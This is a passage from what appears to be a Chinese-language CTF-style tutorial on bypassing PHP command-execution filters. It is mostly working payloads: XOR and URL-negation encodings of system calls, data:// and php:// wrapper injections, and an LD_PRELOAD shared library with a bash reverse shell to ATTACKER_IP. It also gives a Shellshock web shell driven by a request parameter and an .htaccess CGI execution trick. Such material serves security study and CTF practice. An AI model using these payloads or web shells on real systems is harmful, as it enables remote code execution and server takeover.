param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
print(param)
```

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/360b1c1a9d17ca72932cab106dde707e.jpg)

\[+] your function：system
\[+] your command：ls /
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13%00%00"|"%60%60%20%2f");

### 12.3 URL 编码取反绕过

```php
<?php
// system('cat /flag')的取反payload
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);
?>
```



### 12.4  自增构造字符

```php
<?php
$_ = [].''; // 得到"Array"
$___ = $_[$__]; // 得到"A"（$__未定义默认0）
$__ = $___; // $__="A"
$_ = $___; // $_="A"
$__++;$__++;$__++; // 得到"D"
// 继续自增可以构造任意字符
?>
```



## 13. 协议利用绕过



### 13.1  文件读取协议

* `file://`：访问本地文件系统

* `php://filter`：读取源码并进行过滤

* `php://input`：执行POST数据中的PHP代码



### 13.2 数据输入协议

* `data://`：数据流封装器，执行PHP代码

```bash
# 使用data协议执行PHP代码
curl http://example.com/?page=data://text/plain,<?php system('ls');?>

# 使用base64编码
curl http://example.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+
```



### 13.3 压缩包协议

* `zip://`：访问zip压缩包中的文件

* `phar://`：访问PHAR归档中的文件

```bash
# 访问zip中的文件
zip://archive.zip%23file.txt

# 访问phar中的文件
phar://archive.phar/file.txt
```



## 14. 特殊绕过技术



### 14.1  LD\_PRELOAD绕过

**条件**：

1. 能够上传自己的.so文件

2. 能够控制环境变量（putenv函数可用）

3) 存在启动外部程序的函数（mail()、imap\_mail()等）



**步骤**：

1. 编写恶意C代码：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
}

// 重写系统函数
char *strcpy(char *__restrict __dest, const char *__restrict __src) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```



2. 编译为动态库：

```bash
gcc -shared -fPIC exp.c -o exp.so
```



3. 利用PHP执行：

```php
<?php
putenv("LD_PRELOAD=/path/to/exp.so");
mail("", "", "", ""); // 触发外部程序加载恶意库
?>
```



### 14.2 Shellshock漏洞（CVE-2014-6271）绕过

**条件**：

* Linux操作系统

* PHP版本5.\*

* `/bin/bash`存在CVE-2014-6271漏洞

* `putenv()`、`mail()`或`error_log()`函数可用



**利用脚本**：

```php
<?php
function shellshock($cmd) {
    $tmp = tempnam(".","data");
    putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
    error_log('a',1);
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    if($output != "") return $output;
    else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```



### 14.3 Apache Mod CGI绕过

**条件**：

* Linux操作系统

* Apache + PHP (apache\_mod\_php)

* Apache开启了cgi, rewrite

* Web目录给了AllowOverride权限

* 当前目录可写



**利用方法**：

1. 创建.htaccess文件：

```plain text
Options +ExecCGI
AddHandler cgi-script .xxx
```



2. 创建可执行的CGI脚本（后缀.xxx）：

```bash
#!/bin/bash
echo -e "Content-Type: text/html\n\n"
id; cat /flag
```

### 14.4 >/dev/null 2>&1类无回显

代码中插入了`>/dev/null 2>&1`，`>/dev/null 2>&1`的作用就是不回显。利用分隔符`||`即可绕过，分隔符的含义是前一条命令执行失败了才会执行后一条命令。

```plain text
ls || >/dev/null 2>&1
```

## Reference

https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html

https://www.cnblogs.com/kalixcn/p/18002501

https://blog.csdn.net/qq\_42383069/article/details/130221725

https://zhuanlan.zhihu.com/p/672515980

https://blog.csdn.net/Thunderclap\_/article/details/129178221

http://www.huiyao.love/2023/10/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/

https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/

https://pankas.top/2022/09/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/

https://www.freebuf.com/search?search=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87\&activeType=1\&society\_id=0\&society\_name=

https://blog.csdn.net/qq\_43431158/article/details/105422347

https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw


